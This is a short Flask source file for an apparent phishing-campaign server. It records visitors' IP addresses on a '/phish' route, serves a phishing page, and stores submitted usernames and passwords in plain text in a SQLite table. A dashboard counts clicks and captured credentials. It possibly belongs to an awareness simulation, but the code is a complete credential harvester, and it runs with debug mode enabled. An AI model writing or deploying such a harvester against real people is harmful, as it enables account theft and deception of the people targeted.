from flask import Flask, render_template, request
import sqlite3
import datetime

app = Flask(__name__)

def get_db():
    return sqlite3.connect("database.db")

@app.route("/")
def dashboard():

    conn = get_db()
    cur = conn.cursor()

    cur.execute("SELECT COUNT(*) FROM clicks")
    clicks = cur.fetchone()[0]

    cur.execute("SELECT COUNT(*) FROM credentials")
    creds = cur.fetchone()[0]

    conn.close()

    return render_template("dashboard.html",
                           clicks=clicks,
                           creds=creds)

@app.route("/phish")
def phishing():

    ip = request.remote_addr
    time = datetime.datetime.now()

    conn = get_db()
    cur = conn.cursor()

    cur.execute("INSERT INTO clicks(ip,time) VALUES(?,?)",(ip,time))
    conn.commit()
    conn.close()

    return render_template("phishing_template.html")

@app.route("/submit", methods=["POST"])
def submit():

    username = request.form["username"]
    password = request.form["password"]
    time = datetime.datetime.now()

    conn = get_db()
    cur = conn.cursor()

    cur.execute("INSERT INTO credentials(username,password,time) VALUES(?,?,?)",
                (username,password,time))

    conn.commit()
    conn.close()

    return render_template("report.html")

app.run(debug=True)
